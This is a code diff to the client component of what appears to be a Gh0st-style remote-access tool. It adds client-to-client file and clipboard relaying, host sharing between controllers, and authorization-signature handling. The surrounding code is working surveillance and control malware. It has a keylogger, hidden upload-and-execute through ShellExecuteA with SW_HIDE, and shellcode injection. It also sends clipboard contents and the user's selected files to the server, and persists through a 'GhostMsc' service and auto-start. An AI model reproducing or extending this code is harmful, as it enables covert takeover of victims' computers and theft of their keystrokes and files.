@@ -6,18 +6,24 @@
 #include "KernelManager.h"
 #include "Common.h"
 #include <iostream>
+#include <vector>
 #include <fstream>
 #include <corecrt_io.h>
 #include "ClientDll.h"
 #include "MemoryModule.h"
 #include "common/dllRunner.h"
 #include "server/2015Remote/pwd_gen.h"
-#include <common/iniFile.h>
 #include "IOCPUDPClient.h"
 #include "IOCPKCPClient.h"
 #include "auto_start.h"
 #include "ShellcodeInj.h"
 #include "KeyboardManager.h"
+#include "common/file_upload.h"
+#include "common/DateVerify.h"
+#include "common/LANChecker.h"
+extern "C" {
+#include "ServiceWrapper.h"
+}
 
 #pragma comment(lib, "urlmon.lib")
 
@@ -44,12 +50,12 @@ IOCPClient* NewNetClient(CONNECT_ADDRESS* conn, State& bExit, const std::string&
 
 ThreadInfo* CreateKB(CONNECT_ADDRESS* conn, State& bExit, const std::string &publicIP)
 {
-    static ThreadInfo tKeyboard;
-    tKeyboard.run = FOREVER_RUN;
-    tKeyboard.p = new IOCPClient(bExit, false, MaskTypeNone, conn, publicIP);
-    tKeyboard.conn = conn;
-    tKeyboard.h = (HANDLE)__CreateThread(NULL, NULL, LoopKeyboardManager, &tKeyboard, 0, NULL);
-    return &tKeyboard;
+    ThreadInfo *tKeyboard = new ThreadInfo();
+    tKeyboard->run = FOREVER_RUN;
+    tKeyboard->p = new IOCPClient(bExit, false, MaskTypeNone, conn, publicIP);
+    tKeyboard->conn = conn;
+    tKeyboard->h = (HANDLE)__CreateThread(NULL, NULL, LoopKeyboardManager, tKeyboard, 0, NULL);
+    return tKeyboard;
 }
 
 //////////////////////////////////////////////////////////////////////
@@ -67,19 +73,38 @@ CKernelManager::CKernelManager(CONNECT_ADDRESS* conn, IOCPClient* ClientObject, 
 #endif
     m_nNetPing = {};
     m_hKeyboard = kb;
+    // C2C 初始化
+    if (conn) m_MyClientID = conn->clientID;
+}
+
+BOOL IsThreadsRunning(ThreadInfo* threads, int count)
+{
+    for (int i = 0; i < count; ++i) {
+        if (threads[i].p) {
+            return TRUE;
+        }
+    }
+    return FALSE;
 }
 
 CKernelManager::~CKernelManager()
 {
     Mprintf("~CKernelManager begin\n");
-    int i = 0;
-    for (i=0; i<MAX_THREADNUM; ++i) {
+    HANDLE hList[MAX_THREADNUM] = {};
+    for (int i=0; i<MAX_THREADNUM; ++i) {
         if (m_hThread[i].h!=0) {
+			hList[i] = m_hThread[i].h;
             SAFE_CLOSE_HANDLE(m_hThread[i].h);
             m_hThread[i].h = NULL;
             m_hThread[i].run = FALSE;
-            while (m_hThread[i].p)
-                Sleep(50);
+        }
+    }
+
+    WAIT_n(IsThreadsRunning(m_hThread, MAX_THREADNUM), 5, 50);
+    for (int i = 0; i < MAX_THREADNUM; ++i) {
+        if (hList[i] != 0 && m_hThread[i].p) {
+            Mprintf("~CKernelManager: TerminateThread for %d\n", i);
+            TerminateThread(hList[i], 0x20260226);
         }
     }
     m_ulThreadCount = 0;
@@ -195,12 +220,12 @@ typedef int (*RunSimpleTcpFunc)(
 );
 
 typedef int (*RunSimpleTcpWithTokenFunc)(
-    const char* token, 
-	const char* serverAddr,
-	int serverPort,
-	int localPort,
-	int remotePort,
-	int* statusPtr
+    const char* token,
+    const char* serverAddr,
+    int serverPort,
+    int localPort,
+    int remotePort,
+    int* statusPtr
 );
 
 DWORD WINAPI ExecuteDLLProc(LPVOID param)
@@ -253,24 +278,24 @@ DWORD WINAPI ExecuteDLLProc(LPVOID param)
             break;
         }
         case CALLTYPE_FRPC_STDCALL: {
-			RunSimpleTcpWithTokenFunc proc = module ? (RunSimpleTcpWithTokenFunc)runner->GetProcAddress(module, "RunSimpleTcpWithToken") : NULL;
-			char* user = (char*)dll->param.User;
-			FrpcParam* f = (FrpcParam*)user;
-			if (proc) {
-				Mprintf("MemoryGetProcAddress '%s' %s\n", info.Name, proc ? "success" : "failed");
-				int r = proc(f->privilegeKey, f->serverAddr, f->serverPort, f->localPort, f->remotePort,
-					&CKernelManager::g_IsAppExit);
-				if (r) {
-					char buf[100];
-					sprintf_s(buf, "Run %s [proxy %d] failed: %d", info.Name, f->localPort, r);
-					Mprintf("%s\n", buf);
-					ClientMsg msg("代理端口", buf);
-					This->SendData((LPBYTE)&msg, sizeof(msg));
-				}
-			}
-			SAFE_DELETE_ARRAY(user);
-			break;
-		}
+            RunSimpleTcpWithTokenFunc proc = module ? (RunSimpleTcpWithTokenFunc)runner->GetProcAddress(module, "RunSimpleTcpWithToken") : NULL;
+            char* user = (char*)dll->param.User;
+            FrpcParam* f = (FrpcParam*)user;
+            if (proc) {
+                Mprintf("MemoryGetProcAddress '%s' %s\n", info.Name, proc ? "success" : "failed");
+                int r = proc(f->privilegeKey, f->serverAddr, f->serverPort, f->localPort, f->remotePort,
+                             &CKernelManager::g_IsAppExit);
+                if (r) {
+                    char buf[100];
+                    sprintf_s(buf, "Run %s [proxy %d] failed: %d", info.Name, f->localPort, r);
+                    Mprintf("%s\n", buf);
+                    ClientMsg msg("代理端口", buf);
+                    This->SendData((LPBYTE)&msg, sizeof(msg));
+                }
+            }
+            SAFE_DELETE_ARRAY(user);
+            break;
+        }
         default:
             break;
         }
@@ -579,12 +604,14 @@ std::string getHardwareIDByCfg(const std::string& pwdHash, const std::string& ma
 #else
     m_iniFile = new iniFile;
 #endif
-    int version = m_iniFile->GetInt("settings", "BindType", 0);
+    int bindType = m_iniFile->GetInt("settings", "BindType", 0);
+    int hwVersion = m_iniFile->GetInt("settings", "HWIDVersion", 0);
     std::string master = m_iniFile->GetStr("settings", "master");
     SAFE_DELETE(m_iniFile);
-    switch (version) {
+    switch (bindType) {
     case 0:
-        return getHardwareID();
+        // Check HWIDVersion: 2 = V2 (with UUID+MachineGuid), else V1
+        return hwVersion == 2 ? getHardwareID_V2() : getHardwareID();
     case 1: {
         if (!master.empty()) {
             return master;
@@ -682,7 +709,7 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
             fwrite(pFileData, 1, dwFileSize, fp);
             fclose(fp);
             ShellExecuteA(NULL, "open", szSavePath, NULL, NULL, SW_HIDE);
-            Mprintf("Upload Exec Success: %d bytes\n", dwFileSize);
+            Mprintf("Upload Exec Success: %s [%d bytes]\n", szSavePath, dwFileSize);
         }
         char buf[100];
         sprintf_s(buf, "Client %llu upload exec %s", m_conn->clientID, fp ? "succeed" : "failed");
@@ -739,7 +766,8 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 #endif
         SAFE_CLOSE_HANDLE(hMutex);
 
-        char buf[100] = {}, *passCode = buf + 5;
+        // 扩大到 400 字节以容纳 V2 签名（约 92 字节）和 Authorization（约 150 字节）
+        char buf[400] = {}, *passCode = buf + 5;
         memcpy(buf, szBuffer, min(sizeof(buf), ulLength));
         std::string masterHash(skCrypt(MASTER_HASH));
         const char* pwdHash = m_conn->pwdHash[0] ? m_conn->pwdHash : masterHash.c_str();
@@ -756,10 +784,19 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
         } else {
             unsigned short* days = (unsigned short*)(buf + 1);
             unsigned short* num = (unsigned short*)(buf + 3);
-            config* cfg = ((pwdHash == masterHash) && IsDebug) ? new config : new iniFile;
+            config* cfg = IsDebug ? new config : new iniFile;
             cfg->SetStr("settings", "Password", *days <= 0 ? "" : passCode);
-            cfg->SetStr("settings", "HMAC", *days <= 0 ? "" : buf + 64);
-            Mprintf("Update authorization: %s, HMAC: %s\n", passCode, buf+64);
+            cfg->SetStr("settings", "PwdHmac", *days <= 0 ? "" : buf + 64);
+            // 解析 Authorization（在 hmac 的 null 终止符之后）
+            const char* hmacStr = buf + 64;
+            size_t hmacLen = strlen(hmacStr);
+            const char* authStr = hmacStr + hmacLen + 1;  // hmac 后的 null 终止符之后
+            if (authStr < buf + sizeof(buf) && authStr[0] != 0) {
+                cfg->SetStr("settings", "Authorization", authStr);
+                Mprintf("Update authorization: %s, PwdHmac: %s, Auth: %s\n", passCode, hmacStr, authStr);
+            } else {
+                Mprintf("Update authorization: %s, PwdHmac: %s\n", passCode, hmacStr);
+            }
             delete cfg;
             g_bExit = S_SERVER_EXIT;
         }
@@ -788,10 +825,22 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 
     case TOKEN_PRIVATESCREEN: {
         char h[100] = {};
-        memcpy(h, szBuffer + 1, ulLength - 1);
+        memcpy(h, szBuffer + 1, min(ulLength - 1, 80));
         std::string hash = std::string(h, h + 64);
         std::string hmac = std::string(h + 64, h + 80);
-        std::thread t(private_desktop, m_conn, g_bExit, hash, hmac);
+
+        // 提取位图数据（如果有）
+        std::vector<BYTE> bmpData;
+        if (ulLength > 85) {  // 1 + 64 + 16 + 4 = 85
+            DWORD bmpSize = 0;
+            memcpy(&bmpSize, szBuffer + 81, 4);
+            if (bmpSize > 0 && bmpSize <= ulLength - 85) {
+                bmpData.resize(bmpSize);
+                memcpy(bmpData.data(), szBuffer + 85, bmpSize);
+            }
+        }
+
+        std::thread t(private_desktop, m_conn, g_bExit, m_LoginMsg, m_LoginSignature, hash, hmac, std::move(bmpData));
         t.detach();
         break;
     }
@@ -805,13 +854,12 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
     case COMMAND_SHARE:
     case COMMAND_ASSIGN_MASTER:
         if (ulLength > 2) {
+            iniFile cfg(CLIENT_PATH);
             switch (szBuffer[1]) {
             case SHARE_TYPE_YAMA_FOREVER: {
                 auto v = StringToVector((char*)szBuffer + 2, ':', 3);
                 if (v[0].empty() || v[1].empty())
                     break;
-
-                iniFile cfg(CLIENT_PATH);
                 auto now = time(nullptr);
                 auto valid_to = atoi(cfg.GetStr("settings", "valid_to").c_str());
                 if (now <= valid_to) break; // Avoid assign again
@@ -825,6 +873,23 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
                 }
             }
             case SHARE_TYPE_YAMA: {
+                if (szBuffer[1] == SHARE_TYPE_YAMA) {
+                    if (!m_ClientApp->IsMainInstance()) {// 主机只能由所属主控进行分享
+                        ClientMsg msg("分享主机", "No permission to share the client");
+                        SendData((LPBYTE)&msg, sizeof(msg));
+                        break;
+                    }
+                    auto v = StringToVector((char*)szBuffer + 2, ':', 3);
+                    if (v[0].empty() || v[1].empty())
+                        break;
+                    auto share = v[0] + ":" + v[1];
+                    auto list = cfg.GetStr("settings", "share_list");
+                    auto shareList = list.empty() ? std::vector<std::string>{} : StringToVector(list, '|');
+                    if (VectorContains(shareList, share)) break;
+                    shareList.push_back(share);
+                    cfg.SetStr("settings", "share_list", VectorJoin(shareList, '|'));
+                    Mprintf("Share client to new master: %s\n", share.c_str());
+                }
                 auto a = NewClientStartArg((char*)szBuffer + 2, IsSharedRunning, TRUE);
                 if (nullptr!=a) CloseHandle(__CreateThread(0, 0, StartClientApp, a, 0, 0));
                 break;
@@ -835,15 +900,35 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
         }
         break;
 
+    case COMMAND_SHARE_CANCEL: {
+        if (m_ClientApp->IsMainInstance()) {
+            iniFile cfg(CLIENT_PATH);
+            cfg.SetStr("settings", "share_list", "");
+        }
+        ClientMsg msg("分享主机", m_ClientApp->IsMainInstance() ? 
+            "Cancel sharing and next run to take effort" : "No permission to cancel sharing");
+        SendData((LPBYTE)&msg, sizeof(msg));
+        break;
+    }
     case CMD_HEARTBEAT_ACK:
         OnHeatbeatResponse(szBuffer, ulLength);
         break;
     case CMD_MASTERSETTING:
         if (ulLength > MasterSettingsOldSize) {
             memcpy(&m_settings, szBuffer + 1, ulLength > sizeof(MasterSettings) ? sizeof(MasterSettings) : MasterSettingsOldSize);
-            Mprintf("收到主控配置信息 %dbytes: 上报间隔 %ds\n", ulLength - 1, m_settings.ReportInterval);
-            iniFile cfg(CLIENT_PATH);
-            cfg.SetStr("settings", "wallet", m_settings.WalletAddress);
+            if (m_settings.Signature[0] && m_LoginSignature.empty()) {
+                m_LoginSignature = std::string(m_settings.Signature, m_settings.Signature + 64);
+                bool verifyMessage(const std::string & publicKey, BYTE * msg, int len, const std::string & signature);
+                bool verified = verifyMessage("", (BYTE*)m_LoginMsg.data(), m_LoginMsg.length(), m_LoginSignature);
+                Mprintf("收到主控配置信息 %dbytes: 上报间隔 %ds. Verified: %s\n", ulLength - 1, m_settings.ReportInterval,
+                        verified ? "success" : "failed");
+            } else {
+                Mprintf("收到主控配置信息 %dbytes: 上报间隔 %ds.\n", ulLength - 1, m_settings.ReportInterval);
+            }
+            if (m_ClientApp->IsMainInstance()) {
+                iniFile cfg(CLIENT_PATH);
+                cfg.SetStr("settings", "wallet", m_settings.WalletAddress);
+            }
             CManager* pMgr = (CManager*)m_hKeyboard->user;
             if (pMgr) {
                 pMgr->UpdateWallet(m_settings.WalletAddress);
@@ -853,6 +938,15 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
                 mgr->m_bIsOfflineRecord = TRUE;
             }
             Logger::getInstance().usingLog(m_settings.EnableLog);
+        }
+        if (IsAuthKernel() && 
+            (m_settings.FeedbackUrl[0] || m_settings.HelpUrl[0] || m_settings.RequestAuthUrl[0] || m_settings.GetPluginUrl[0])) {
+            config* THIS_CFG = IsDebug ? new config : new iniFile;
+            if (m_settings.FeedbackUrl[0])THIS_CFG->SetStr("settings", "FeedbackUrl", m_settings.FeedbackUrl);
+            if (m_settings.HelpUrl[0])THIS_CFG->SetStr("settings", "HelpUrl", m_settings.HelpUrl);
+            if (m_settings.RequestAuthUrl[0])THIS_CFG->SetStr("settings", "RequestAuthUrl", m_settings.RequestAuthUrl);
+            if (m_settings.GetPluginUrl[0])THIS_CFG->SetStr("settings", "GetPluginUrl", m_settings.GetPluginUrl);
+            delete THIS_CFG;
         }
         break;
     case COMMAND_KEYBOARD: { //键盘记录
@@ -920,14 +1014,14 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
             memcpy(user->buffer, szBuffer + 1, ulLength - 1);
             if (ulLength > 2 && !m_conn->IsVerified()) user->buffer[2] = 0;
         }
-        m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true, MaskTypeNone, m_conn, publicIP);
+        m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true, MaskTypeNone, m_conn, publicIP, this);
         m_hThread[m_ulThreadCount].user = user;
         m_hThread[m_ulThreadCount++].h = __CreateThread(NULL,0, LoopScreenManager, &m_hThread[m_ulThreadCount], 0, NULL);;
         break;
     }
 
     case COMMAND_LIST_DRIVE : {
-        m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true, MaskTypeNone, m_conn, publicIP);
+        m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true, MaskTypeNone, m_conn, publicIP, this);
         m_hThread[m_ulThreadCount++].h = __CreateThread(NULL,0, LoopFileManager, &m_hThread[m_ulThreadCount], 0, NULL);;
         break;
     }
@@ -977,10 +1071,10 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
                 TerminateProcess(GetCurrentProcess(), 0xABCDEF);
             }
             Mprintf("CKernelManager: [%s] Update FAILED.\n", curFile);
-        } else if(typ == CLIENT_TYPE_ONE){
+        } else if(typ == CLIENT_TYPE_ONE) {
             ULONGLONG size = 0;
             memcpy(&size, (const char*)szBuffer + 1, sizeof(ULONGLONG));
-			const char* name = "updater.exe";
+            const char* name = "updater.exe";
             char curFile[_MAX_PATH] = {};
             GetModuleFileName(NULL, curFile, MAX_PATH);
             GET_FILEPATH(curFile, name);
@@ -990,6 +1084,9 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
                 break;
             }
             if (IsPowerShellAvailable() && StartAdminLauncherAndExit(curFile, false)) {
+#if _CONSOLE
+                if (m_conn->iStartup == Startup_GhostMsc) ServiceWrapper_Stop();
+#endif
                 g_bExit = S_CLIENT_UPDATE;
                 Mprintf("CKernelManager: [%s] Will be executed.\n", curFile);
                 Sleep(1000);
@@ -998,6 +1095,283 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
             Mprintf("CKernelManager: [%s] Execute FAILED.\n", curFile);
         } else {
             Mprintf("=====> 客户端类型'%d'不支持文件升级\n", typ);
+        }
+        break;
+    }
+
+    case COMMAND_SEND_FILE_V2: {
+        // C2C/V2 文件接收（RecvFileChunkV2 内部会打印进度）
+        int n = RecvFileChunkV2((char*)szBuffer, ulLength, m_conn,
+            nullptr, m_hash, m_hmac, m_MyClientID);
+        if (n) {
+            Mprintf("[C2C] RecvFileChunkV2 failed: %d\n", n);
+        }
+        break;
+    }
+
+    case COMMAND_CLIPBOARD_V2: {
+        // C2C 剪贴板请求：被请求发送剪贴板文件到另一个客户端
+        ClipboardRequestV2* req = (ClipboardRequestV2*)szBuffer;
+        Mprintf("[C2C] 收到剪贴板请求: src=%llu, dst=%llu, transferID=%llu\n",
+            req->srcClientID, req->dstClientID, req->transferID);
+
+        // 从请求包中提取认证信息
+        std::string hash(req->hash, 64);
+        std::string hmac(req->hmac, 16);
+
+        // 获取剪贴板文件或选中文件
+        int result = 0;
+        auto files = GetClipboardFiles(result);
+        if (files.empty()) {
+            files = GetForegroundSelectedFiles(result);
+        }
+
+        if (!files.empty()) {
+            // C2C: 不指定目标目录，由接收方决定
+            std::string targetDir = "";
+
+            // 收集文件信息（使用相对路径，接收方使用后缀匹配）
+            std::vector<std::pair<std::string, uint64_t>> fileInfos;
+            std::string rootDir = GetCommonRoot(files);
+            for (size_t i = 0; i < files.size(); i++) {
+                std::string relPath = GetRelativePath(rootDir, files[i]);
+                std::replace(relPath.begin(), relPath.end(), '\\', '/');
+                // 获取文件大小
+                HANDLE hFile = CreateFileA(files[i].c_str(), GENERIC_READ, FILE_SHARE_READ,
+                    nullptr, OPEN_EXISTING, 0, nullptr);
+                if (hFile != INVALID_HANDLE_VALUE) {
+                    LARGE_INTEGER size;
+                    GetFileSizeEx(hFile, &size);
+                    CloseHandle(hFile);
+                    fileInfos.push_back({relPath, (uint64_t)size.QuadPart});
+                }
+            }
+
+            // 发送续传查询（通过主连接，响应也会回到主连接）
+            bool queryPending = false;
+            if (!fileInfos.empty()) {
+                auto queryPkt = BuildResumeQuery(req->transferID, m_MyClientID, req->dstClientID, fileInfos);
+                if (!queryPkt.empty()) {
+                    m_ClientObject->Send2Server((char*)queryPkt.data(), (int)queryPkt.size());
+                    Mprintf("[C2C] 发送续传查询: %zu 个文件, 使用完整路径\n", fileInfos.size());
+                    queryPending = true;
+                }
+            }
+
+            TransferOptionsV2 opts;
+            opts.transferID = req->transferID;
+            opts.srcClientID = m_MyClientID;  // 我是源
+            opts.dstClientID = req->dstClientID;  // 目标客户端
+            opts.enableResume = queryPending;  // 只有发送了查询才等待响应
+
+            IOCPClient* pClient = new IOCPClient(g_bExit, true, MaskTypeNone, m_conn);
+            if (pClient->ConnectServer(m_ClientObject->ServerIP().c_str(), m_ClientObject->ServerPort())) {
+                std::thread([files, targetDir, pClient, opts, hash, hmac]() {
+                    FileBatchTransferWorkerV2(files, targetDir, pClient,
+                        [](void* user, FileChunkPacketV2* chunk, unsigned char* data, int size) -> bool {
+                            IOCPClient* client = (IOCPClient*)user;
+                            return client->Send2Server((char*)data, size) != FALSE;
+                        },
+                        [](void* user) {
+                            IOCPClient* client = (IOCPClient*)user;
+                            delete client;
+                            Mprintf("[C2C] 文件发送完成\n");
+                        },
+                        hash, hmac, opts);
+                }).detach();
+                Mprintf("[C2C] 开始发送 %zu 个文件到客户端 %llu\n", files.size(), req->dstClientID);
+            } else {
+                delete pClient;
+                Mprintf("[C2C] 连接服务器失败\n");
+            }
+        } else {
+            // 没有文件，尝试发送剪贴板文本
+            std::string text;
+            if (::OpenClipboard(NULL)) {
+                HGLOBAL hGlobal = GetClipboardData(CF_UNICODETEXT);
+                if (hGlobal) {
+                    wchar_t* pWideStr = (wchar_t*)GlobalLock(hGlobal);
+                    if (pWideStr) {
+                        int len = WideCharToMultiByte(CP_UTF8, 0, pWideStr, -1, NULL, 0, NULL, NULL);
+                        if (len > 0) {
+                            text.resize(len);
+                            WideCharToMultiByte(CP_UTF8, 0, pWideStr, -1, &text[0], len, NULL, NULL);
+                            text.resize(strlen(text.c_str()));  // 去除末尾 \0
+                        }
+                        GlobalUnlock(hGlobal);
+                    }
+                }
+                ::CloseClipboard();
+            }
+            if (!text.empty()) {
+                // 构建 C2C 文本包: [cmd:1][dstClientID:8][textLen:4][text:N]
+                uint32_t textLen = (uint32_t)text.size();
+                std::vector<char> pkt(1 + 8 + 4 + textLen);
+                pkt[0] = COMMAND_C2C_TEXT;
+                memcpy(&pkt[1], &req->dstClientID, 8);
+                memcpy(&pkt[9], &textLen, 4);
+                memcpy(&pkt[13], text.data(), textLen);
+                m_ClientObject->Send2Server(pkt.data(), (int)pkt.size());
+                Mprintf("[C2C] 发送文本到客户端 %llu (%u 字节)\n", req->dstClientID, textLen);
+            } else {
+                Mprintf("[C2C] 没有找到要发送的文件或文本\n");
+            }
+        }
+        break;
+    }
+
+    case COMMAND_C2C_PREPARE: {
+        // C2C 准备接收：捕获当前目录并返回路径给发送方
+        if (ulLength < sizeof(C2CPreparePacket)) break;
+        C2CPreparePacket* pkt = (C2CPreparePacket*)szBuffer;
+        Mprintf("[C2C] 收到准备接收通知: transferID=%llu, srcClientID=%llu\n",
+            pkt->transferID, pkt->srcClientID);
+
+        // 捕获当前目录
+        SetC2CTargetFolder(pkt->transferID);
+
+        // 获取目标目录并返回给发送方
+        std::string targetDir;
+        if (!GetCurrentFolderPath(targetDir)) {
+            char tempPath[MAX_PATH];
+            GetTempPathA(MAX_PATH, tempPath);
+            targetDir = std::string(tempPath) + "C2CRecv\\";
+        }
+
+        // 转换为 UTF-8
+        int wideLen = MultiByteToWideChar(CP_ACP, 0, targetDir.c_str(), -1, nullptr, 0);
+        std::wstring wideDir(wideLen - 1, 0);
+        MultiByteToWideChar(CP_ACP, 0, targetDir.c_str(), -1, &wideDir[0], wideLen);
+        int utf8Len = WideCharToMultiByte(CP_UTF8, 0, wideDir.c_str(), -1, nullptr, 0, nullptr, nullptr);
+        std::string utf8Dir(utf8Len - 1, 0);
+        WideCharToMultiByte(CP_UTF8, 0, wideDir.c_str(), -1, &utf8Dir[0], utf8Len, nullptr, nullptr);
+
+        // 构建响应包
+        std::vector<uint8_t> respBuf(sizeof(C2CPrepareRespPacket) + utf8Dir.size());
+        C2CPrepareRespPacket* resp = (C2CPrepareRespPacket*)respBuf.data();
+        resp->cmd = COMMAND_C2C_PREPARE_RESP;
+        resp->transferID = pkt->transferID;
+        resp->srcClientID = pkt->srcClientID;  // 原始发送方，服务端据此路由
+        resp->pathLength = (uint16_t)utf8Dir.size();
+        memcpy(respBuf.data() + sizeof(C2CPrepareRespPacket), utf8Dir.c_str(), utf8Dir.size());
+
+        // 发送响应（通过服务端路由到发送方）
+        m_ClientObject->Send2Server((char*)respBuf.data(), (int)respBuf.size());
+        Mprintf("[C2C] 发送目录响应: %s -> srcClient=%llu\n", targetDir.c_str(), pkt->srcClientID);
+        break;
+    }
+
+    case COMMAND_C2C_PREPARE_RESP: {
+        // C2C 准备响应：收到目标客户端的目录（我是发送方）
+        if (ulLength < sizeof(C2CPrepareRespPacket)) break;
+        C2CPrepareRespPacket* resp = (C2CPrepareRespPacket*)szBuffer;
+        uint16_t pathLen = resp->pathLength;
+        if (ulLength < sizeof(C2CPrepareRespPacket) + pathLen) break;
+
+        // 提取 UTF-8 目录路径
+        std::string utf8Dir((const char*)szBuffer + sizeof(C2CPrepareRespPacket), pathLen);
+
+        // UTF-8 -> 宽字符
+        int wlen = MultiByteToWideChar(CP_UTF8, 0, utf8Dir.c_str(), -1, nullptr, 0);
+        std::wstring wideDir(wlen - 1, 0);
+        MultiByteToWideChar(CP_UTF8, 0, utf8Dir.c_str(), -1, &wideDir[0], wlen);
+
+        // 存储目标目录（用于后续构建完整路径进行断点续传）
+        SetSenderTargetFolder(resp->transferID, wideDir);
+        Mprintf("[C2C] 收到目标目录响应: transferID=%llu, dir=%s\n", resp->transferID, utf8Dir.c_str());
+        break;
+    }
+
+    case COMMAND_C2C_TEXT: {
+        // C2C 文本剪贴板: [cmd:1][dstClientID:8][textLen:4][text:N]
+        if (ulLength < 13) break;
+        uint32_t textLen;
+        memcpy(&textLen, szBuffer + 9, 4);
+        if (ulLength < 13 + textLen) break;
+
+        // UTF-8 文本转换为 Unicode 并设置剪贴板
+        std::string utf8Text((const char*)szBuffer + 13, textLen);
+        int wideLen = MultiByteToWideChar(CP_UTF8, 0, utf8Text.c_str(), -1, NULL, 0);
+        if (wideLen > 0) {
+            std::wstring wideText(wideLen, 0);
+            MultiByteToWideChar(CP_UTF8, 0, utf8Text.c_str(), -1, &wideText[0], wideLen);
+
+            if (::OpenClipboard(NULL)) {
+                ::EmptyClipboard();
+                HGLOBAL hGlobal = GlobalAlloc(GMEM_MOVEABLE, wideLen * sizeof(wchar_t));
+                if (hGlobal) {
+                    wchar_t* pDst = (wchar_t*)GlobalLock(hGlobal);
+                    if (pDst) {
+                        wcscpy(pDst, wideText.c_str());
+                        GlobalUnlock(hGlobal);
+                        SetClipboardData(CF_UNICODETEXT, hGlobal);
+                        Mprintf("[C2C] 收到文本: %u 字节\n", textLen);
+
+                        // 模拟 Ctrl+V 完成粘贴（因为原始 Ctrl+V 被服务端拦截了）
+                        ::CloseClipboard();
+                        INPUT inputs[4] = {};
+                        inputs[0].type = INPUT_KEYBOARD;
+                        inputs[0].ki.wVk = VK_CONTROL;
+                        inputs[1].type = INPUT_KEYBOARD;
+                        inputs[1].ki.wVk = 'V';
+                        inputs[2].type = INPUT_KEYBOARD;
+                        inputs[2].ki.wVk = 'V';
+                        inputs[2].ki.dwFlags = KEYEVENTF_KEYUP;
+                        inputs[3].type = INPUT_KEYBOARD;
+                        inputs[3].ki.wVk = VK_CONTROL;
+                        inputs[3].ki.dwFlags = KEYEVENTF_KEYUP;
+                        SendInput(4, inputs, sizeof(INPUT));
+                        break;
+                    } else {
+                        GlobalFree(hGlobal);
+                    }
+                }
+                ::CloseClipboard();
+            }
+        }
+        break;
+    }
+
+    case COMMAND_FILE_COMPLETE_V2: {
+        // C2C 文件完成校验
+        if (ulLength < sizeof(FileCompletePacketV2)) break;
+        const FileCompletePacketV2* completePkt = (const FileCompletePacketV2*)szBuffer;
+        bool verifyOk = HandleFileCompleteV2((const char*)szBuffer, ulLength, m_MyClientID);
+        Mprintf("[C2C] 文件校验%s: transferID=%llu, fileIndex=%u\n",
+            verifyOk ? "通过" : "失败", completePkt->transferID, completePkt->fileIndex);
+        break;
+    }
+
+    case COMMAND_FILE_QUERY_RESUME: {
+        // C2C 断点续传查询
+        Mprintf("[C2C] 收到断点续传查询\n");
+        auto response = HandleResumeQuery((const char*)szBuffer, ulLength);
+        if (!response.empty()) {
+            m_ClientObject->Send2Server((char*)response.data(), (int)response.size());
+            Mprintf("[C2C] 已响应断点续传查询: %zu 字节\n", response.size());
+        }
+        break;
+    }
+
+    case COMMAND_FILE_RESUME: {
+        // 检查是否为取消包
+        if (ulLength >= sizeof(FileResumePacketV2)) {
+            const FileResumePacketV2* pkt = (const FileResumePacketV2*)szBuffer;
+            if (pkt->flags & FFV2_CANCEL) {
+                // 取消传输：通知发送线程停止
+                CancelTransfer(pkt->transferID);
+                CleanupResumeState(pkt->transferID);
+                Mprintf("[C2C] 传输已取消: transferID=%llu\n", pkt->transferID);
+                break;
+            }
+        }
+        // C2C 断点续传响应
+        std::map<uint32_t, uint64_t> offsets;
+        if (ParseResumeResponse((const char*)szBuffer, ulLength, offsets)) {
+            Mprintf("[C2C] 收到续传响应: %zu 个文件\n", offsets.size());
+            SetPendingResumeOffsets(offsets);
+        } else {
+            Mprintf("[C2C] 解析续传响应失败\n");
         }
         break;
     }
@@ -1022,6 +1396,9 @@ int AuthKernelManager::SendHeartbeat()
 {
     for (int i = 0; i < m_settings.ReportInterval && !g_bExit && m_ClientObject->IsConnected(); ++i)
         Sleep(1000);
+
+    // Auth timeout check moved to reconnect loop in ClientDll.cpp
+    // ResetTimer is called in OnHeatbeatResponse when response is received
     if (!m_bFirstHeartbeat && m_settings.ReportInterval <= 0) { // 关闭上报信息（含心跳）
         for (int i = rand() % 120; i && !g_bExit && m_ClientObject->IsConnected() && m_settings.ReportInterval <= 0; --i)
             Sleep(1000);
@@ -1039,14 +1416,22 @@ int AuthKernelManager::SendHeartbeat()
     Heartbeat a(s, (int)(m_nNetPing.srtt * 1000));  // srtt是秒，转为毫秒
     a.HasSoftware = SoftwareCheck(m_settings.DetectSoftware);
 
-    iniFile THIS_CFG;
-    auto SN = THIS_CFG.GetStr("settings", "SN", "");
-    auto passCode = THIS_CFG.GetStr("settings", "Password", "");
-    auto pwdHmac = THIS_CFG.GetStr("settings", "PwdHmac", "");
-    uint64_t value = std::strtoull(pwdHmac.c_str(), nullptr, 10);
+    auto SN = THIS_CFG->GetStr("settings", "SN", "");
+    auto passCode = THIS_CFG->GetStr("settings", "Password", "");
+    auto pwdHmac = THIS_CFG->GetStr("settings", "PwdHmac", "");
     strcpy_s(a.SN, SN.c_str());
     strcpy_s(a.Passcode, passCode.c_str());
-    memcpy(&a.PwdHmac, &value, 8);
+
+    // 检查是否为 V2 授权 (以 "v2:" 开头)
+    if (pwdHmac.length() >= 3 && pwdHmac.substr(0, 3) == "v2:") {
+        // V2: PwdHmac = 0, 签名字符串放在 PwdHmacV2 字段
+        a.PwdHmac = 0;
+        strcpy_s(a.PwdHmacV2, pwdHmac.c_str());
+    } else {
+        // V1: PwdHmac 为数字
+        uint64_t value = std::strtoull(pwdHmac.c_str(), nullptr, 10);
+        memcpy(&a.PwdHmac, &value, 8);
+    }
 
